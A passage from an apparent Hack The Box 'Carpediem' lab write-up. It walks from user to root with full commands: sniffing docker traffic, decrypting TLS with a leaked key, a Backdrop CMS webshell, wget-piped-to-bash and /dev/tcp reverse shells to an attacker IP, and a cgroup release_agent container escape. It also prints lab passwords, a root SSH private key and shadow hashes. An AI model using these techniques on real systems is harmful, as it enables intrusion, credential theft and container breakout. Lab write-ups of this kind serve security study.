Calling and listening to Horace's voice message we learn that the password is `AuRj4pxq9qPk` ! 
Testing to login with SSH and we finally get a shell on the box and user.txt.

```bash
➜  carpediem ssh hflaccus@carpediem.htb
hflaccus@carpediem.htb password: AuRj4pxq9qPk

hflaccus@carpediem:~$ id && hostname
uid=1000(hflaccus) gid=1000(hflaccus) groups=1000(hflaccus)
carpediem

hflaccus@carpediem:~$ cat user.txt 
c34afcb6b1659fb635027da20531bc7e
```


-----------------
# ROOT
### Step 1
Enumerating manually the information we find is pretty slim so instead fire up `linpeas.sh` right away. 

Going through the output we have two lines shining in red/yellow indicating a 95% PE vector
```bash
hflaccus@carpediem:/tmp$ ./linpeas.sh

════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════
╔══════════╣ Cleaned processes
[i] Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
                 1578848   sed-Es,jdwp|tmux |screen |--inspect|--remote-debugging-port,&,g

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Files with capabilities (limited to 50):
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip

╔══════════╣ Can I sniff with tcpdump?
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sniffing
You can sniff with tcpdump!

══╣ Possible private SSH keys were found!
/etc/ssl/certs/backdrop.carpediem.htb.key
```

There's a section on [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_net_admin-+-cap_net_raw) explaining the capabilities combination of cep_net_admin + cap_net_raw - tldr we can dump traffic from network interfaces.
I'm not sure what we're looking for, or what interface to dump, but since there are a lot of dockers and we know that there is a FTP + several http services, we might find something sensitive there.

NOTE: I left this pcap on for about 1 hour while leaving for a meeting, so there's a lot of traffic in my .pcap.
```bash
➜  carpediem nc -lp 1234 > docker0.pcap

hflaccus@carpediem:/tmp$ tcpdump -i docker0 -s 65535 -w docker0.pcap
tcpdump: listening on docker0, link-type EN10MB (Ethernet), capture size 65535 bytes
7171 packets captured
7171 packets received by filter
0 packets dropped by kernel

hflaccus@carpediem:/tmp$ nc -w3 10.10.14.10 1234 < docker0.pcap
```

Instead of using Wireshark like it's 1998, I send the .pcap to my Windows Attack VM and open it using _NetworkMiner_ (like it's 2007) - I think this gives a better quick overview of the dump. From the dump we can quickly see that a certificate has been sent from `backdrop.carpediem.htb` to the docker host on 172.17.0.1, I have no idea of what to do with this information.

![[/assets/images/htb-writeup-carpediem/carpediem17.png]]

Next step took me embarrassingly long time to figure out - from our _linpeas_ output we found a private SSH key. We can use this key to decrypt all SSL traffic, and within we find something interesting.

```bash
➜  carpediem nc -lp 1234 > backdrop.carpediem.htb.key
hflaccus@carpediem:/tmp$ nc -w3 10.10.14.10 1234 < /etc/ssl/certs/backdrop.carpediem.htb.key
```

![[/assets/images/htb-writeup-carpediem/carpediem18.png]]

Now if we follow the TLS Stream we find a login to https://backdrop.carpediem.htb with credentials `jpardella:tGPN6AmJDZwYWdhY`
![[/assets/images/htb-writeup-carpediem/carpediem19.png]]


### Step 2
Now to access `backdrop` we cant simply tunnel with `hflaccus`:
```bash
hflaccus@carpediem:~$ cat /etc/hosts
127.0.0.1 localhost backdrop.carpediem.htb

hflaccus@carpediem:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8002          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5038          0.0.0.0:*               LISTEN      -  
```

Going through all the different ports we find that **8002** is `backdrop`:
```bash
➜  carpediem ssh -N -f -L 8002:localhost:8002 hflaccus@carpediem.htb
hflaccus@carpediem.htb password: AuRj4pxq9qPk

➜  carpediem curl -k https://localhost:8002
[... snip ...]
    <title>Home | backdrop.carpediem.htb</title>
```

We're now able to login to _backdrop_ using credentials `jpardella:tGPN6AmJDZwYWdhY`
![[/assets/images/htb-writeup-carpediem/carpediem20.png]]

Googling for _"Backdrop cms exploit github"_ the first hit we get is a [CSRF to RCE](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS) exploit for version 1.20. Looking in backdrop under _Reports_ > _Status Report_ we see that our instance is running version 1.21.4, lets test it anyway.

Go to _Functionality_ > _Install new modules_ > _Manual Installation_ > _Upload_, once uploaded make sure to enable the newly added module. It will be located at the bottom of the box _Fields_:

![[/assets/images/htb-writeup-carpediem/carpediem21.png]]

Testing it out and yes, we do have code execution:
```bash
➜  carpediem curl -k https://localhost:8002/modules/reference/shell.php\?cmd\=id      
uid=33(www-data) gid=33(www-data) groups=33(www-data)
➜  carpediem curl -k https://localhost:8002/modules/reference/shell.php\?cmd\=hostname
90c7f522b842
➜  carpediem curl -k https://localhost:8002/modules/reference/shell.php\?cmd\=ls%20-al
total 76
drwxr-xr-x 4 www-data www-data  4096 Sep 14 00:55 .
drwxr-xr-x 3 www-data www-data  4096 Sep 14 00:55 ..
-rw-r--r-- 1 www-data www-data 18092 Sep 14 00:55 LICENSE.txt
-rw-r--r-- 1 www-data www-data  1768 Sep 14 00:55 README.md
-rw-r--r-- 1 www-data www-data   323 Sep 14 00:55 reference.info
-rw-r--r-- 1 www-data www-data   484 Sep 14 00:55 reference.install
-rw-r--r-- 1 www-data www-data 23598 Sep 14 00:55 reference.module
-rw-r--r-- 1 www-data www-data    30 Sep 14 00:55 shell.php
drwxr-xr-x 2 www-data www-data  4096 Sep 14 00:55 tests
drwxr-xr-x 2 www-data www-data  4096 Sep 14 00:55 views
```

Using cURL to trigger a reverse shell (like before) doesn't seem to work in this container, instead we use **wget**:
```bash
➜  carpediem curl -k https://localhost:8002/modules/reference/shell.php\?cmd\=wget%20-qO-%20http://10.10.14.10/rev.sh\|bash

➜  carpediem python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.167 - - [14/Sep/2022 09:03:27] "GET /rev.sh HTTP/1.1" 200 

➜  carpediem nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.167] 58916
bash: cannot set terminal process group (271): Inappropriate ioctl for device
bash: no job control in this shell
www-data@90c7f522b842:/var/www/html/backdrop/modules/reference$ 
```


### Step 3
Before uploading `deepce.sh` lets have a look around if we find anything sensitive.

New MySQL credentials:
```bash
www-data@90c7f522b842:/var/www/html/backdrop$ cat settings.php
[... snip ...]
$database = 'mysql://backdrop:34tB8RGtgtJjZ2Tz@localhost/backdrop';

```

A script owned by root that we have execute privileges over:
```bash
www-data@90c7f522b842:/opt$ ls -al
total 12
drwxr-xr-x 1 root root 4096 Jun 23 09:50 .
drwxr-xr-x 1 root root 4096 Sep 14 01:10 ..
-rwxr-xr-x 1 root root  510 Jun 23 09:49 heartbeat.sh

www-data@90c7f522b842:/opt$ cat heartbeat.sh
#!/bin/bash
#Run a site availability check every 10 seconds via cron
checksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))
if [[ $checksum != "70a121c0202a33567101e2330c069b34" ]]; then
	exit
fi
status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)
grep "Welcome to backdrop.carpediem.htb!" "$status"
if [[ "$?" != 0 ]]; then
	#something went wrong.  restoring from backup.
	cp /root/index.php /var/www/html/backdrop/index.php
fi
```

The comments in the scripts do a good job explaining what it does, every few seconds it will run the script to make sure that ``backdrop.carpediem.htb`` is alive and running. If something is wrong, it will copy a backup of `index.php` from `/root`, to restore the site. 

We can confirm if this script is executed by `root` or `www-data` using `pspy64`:
```bash
www-data@90c7f522b842:/dev/shm$ wget http://10.10.14.10/pspy64
www-data@90c7f522b842:/dev/shm$ chmod +x pspy64
www-data@90c7f522b842:/dev/shm$ cp pspy64 /tmp
www-data@90c7f522b842:/dev/shm$ /tmp/pspy64
[... snip ...]
2022/09/14 01:25:17 CMD: UID=0    PID=54872  | /bin/bash /opt/heartbeat.sh
```

It's ran as root. We should be able to get a revere shell as root then by simply replacing index.php with a reverse shell..
```bash
www-data@90c7f522b842:/dev/shm$ cp rev.php /var/www/html/backdrop/index.php

➜  carpediem nc -lvnp 4499                              
listening on [any] 4499 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.167] 41614
Linux 90c7f522b842 5.4.0-97-generic #110-Ubuntu SMP Thu Jan 13 18:22:13 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 01:30:16 up 1 day, 23:13,  0 users,  load average: 0.03, 0.09, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: cant access tty; job control turned off

# id && hostname
uid=0(root) gid=0(root) groups=0(root)
90c7f522b842
```


### Step 4
Trying to escape this container we can upload `deepce.sh` to get some quick information:
```bash
# wget http://10.10.14.10/deepce.sh
# chmod +x deepce.sh
# bash deepce.sh
[... snip ...]
[+] Dangerous Capabilities .. Yes
Current: cap_dac_override
Bounding set =cap_dac_override
Current IAB: !cap_dac_read_search,!cap_sys_module,!cap_sys_ptrace,!cap_sys_admin
[+] Privileged Mode ......... Unknown

[+] Docker sock mounted ....... No
[+] Other mounts .............. No
```

To verify if we're in a privileged mode or not, we can simply `ls -al /dev`, if privileged all devices should be accessible and we can escape by mounting the host disk. If not privileged only a limited amount of devices are shown.

```bash
# ls -al /dev	
total 4
drwxr-xr-x 5 root root    360 Sep 12 02:16 .
drwxr-xr-x 1 root root   4096 Sep 14 02:15 ..
crw--w---- 1 root tty  136, 0 Sep 12 02:16 console
lrwxrwxrwx 1 root root     11 Sep 12 02:16 core -> /proc/kcore
lrwxrwxrwx 1 root root     13 Sep 12 02:16 fd -> /proc/self/fd
crw-rw-rw- 1 root root   1, 7 Sep 12 02:16 full
drwxrwxrwt 2 root root     40 Sep 12 02:16 mqueue
crw-rw-rw- 1 root root   1, 3 Sep 12 02:16 null
lrwxrwxrwx 1 root root      8 Sep 12 02:16 ptmx -> pts/ptmx
drwxr-xr-x 2 root root      0 Sep 12 02:16 pts
crw-rw-rw- 1 root root   1, 8 Sep 12 02:16 random
drwxrwxrwt 3 root root    120 Sep 14 01:46 shm
lrwxrwxrwx 1 root root     15 Sep 12 02:16 stderr -> /proc/self/fd/2
lrwxrwxrwx 1 root root     15 Sep 12 02:16 stdin -> /proc/self/fd/0
lrwxrwxrwx 1 root root     15 Sep 12 02:16 stdout -> /proc/self/fd/1
crw-rw-rw- 1 root root   5, 0 Sep 12 02:16 tty
crw-rw-rw- 1 root root   1, 9 Sep 12 02:16 urandom
crw-rw-rw- 1 root root   1, 5 Sep 12 02:16 zero
```

We're missing a lot of devices, so we're not privileged. 

Looking on the capabilities, we only have `dac_override` that stands out, this allows us to write to any file, something that is expected when `root` so we can skip this. 

Googling around for further escapes I come across [this PDF](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf) from blackhat where `release_agent` escape is mentioned on page 57. I've never heard of this before, and looking on the commands we can see we'll not be able to run it as we're not allowed to use `mount`:

![[/assets/images/htb-writeup-carpediem/carpediem22.png]]

```bash
# mount -t cgroup -o rdma cgroup /tmp/esc
mount: /tmp/esc: permission denied.
```

Running `linpeas.sh` confirms that this should be a breakout vector, so maybe I need to dig a bit deeper.
```bash
# wget http://10.10.14.10/linpeas.sh
# chmod +x linpeas.sh
# bash linpeas.sh 

══╣ Breakout via mounts
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
═╣ release_agent breakout 1........ Yes
```

Steal the script from HackTricks, upload it and run doesn't work either..
```bash
➜  carpediem cat esc.sh 
# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o


# wget http://10.10.14.10/esc.sh
# chmod +x esc.sh
# bash esc.sh
mkdir: cannot create directory '/sys/fs/cgroup/rdma/w': Read-only file system
esc.sh: line 11: /sys/fs/cgroup/rdma/w/notify_on_release: No such file or directory
esc.sh: line 20: /sys/fs/cgroup/rdma/release_agent: Read-only file system
sh: 1: cannot create /sys/fs/cgroup/rdma/w/cgroup.procs: Directory nonexistent
```

After a bit more investigating I come across [this post](https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492) about CVE-2022-0492 explaining how we can create new user namespace and cgroup namespace using `unshare -UrmC bash`, and then be able to mount the cgroupfs. 

> _".. in the container we execute unshare to create new user namespace and cgroup namespace. Then we can mount the cgroupfs and write our data to release_agent."_

So lets jump back to the first escape from Blackhat, this time using `unshare` to create new namespaces. 

```bash
# wget http://10.10.14.10/esc.sh
# chmod +x esc.sh
# cat esc.sh
mkdir /tmp/esc
mount -t cgroup -o rdma cgroup /tmp/esc
mkdir /tmp/esc/w
echo 1 > /tmp/esc/w/notify_on_release
pop="$overlay/shell.sh"
echo "bash -i >& /dev/tcp/10.10.14.10/4400 0>&1" > /shell.sh
chmod +x /shell.sh
echo $pop > /tmp/esc/release_agent
sleep 5 && echo 0>/tmp/esc/w/cgroup.procs &

# unshare -UrmC bash
bash esc.sh
```

Nothing happens.. I really don't understand the `$overlay` part, echoing it returns nothing. Investigating this further we find another, very similar, [PoC](https://blog.aquasec.com/threat-alert-container-escape):
![[/assets/images/htb-writeup-carpediem/carpediem23.png]]

With some trial-and-error I got the escape working, for me the issue was my payload - so make sure to test it before incorporating it to a exploit. 
```bash
# unshare -UrmC bash
wget http://10.10.14.10/esc.sh
chmod +x esc.sh


cat esc.sh
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.10/4400 0>&1'" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output


bash esc.sh
```

```bash
➜  carpediem nc -lvnp 4400            
listening on [any] 4400 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.167] 56780
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@carpediem:/# id && hostname
uid=0(root) gid=0(root) groups=0(root)
carpediem

root@carpediem:/# cat /root/root.txt
c57deb2eb7b17c84a0e40dc099b0bb70

root@carpediem:/# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

root@carpediem:/# cat /etc/shadow
root:$6$y5QrvfE3csMMok1t$DvYGED3VsftC3ylIHA8yGVg2j2KiP7uooPn309LahXXPEZulnVWBwwKLorPdiW5snCgWEYN6F24b8LQALG1CD1:19081:0:99999:7:::
hflaccus:$6$Y3pKa50HWcGkr/KE$ZBG57pq5RIwDs9l75xJMz5Cv2SweVTFOcsv3WzRLC9c/QRX7wSgNT/XekUYEx
```
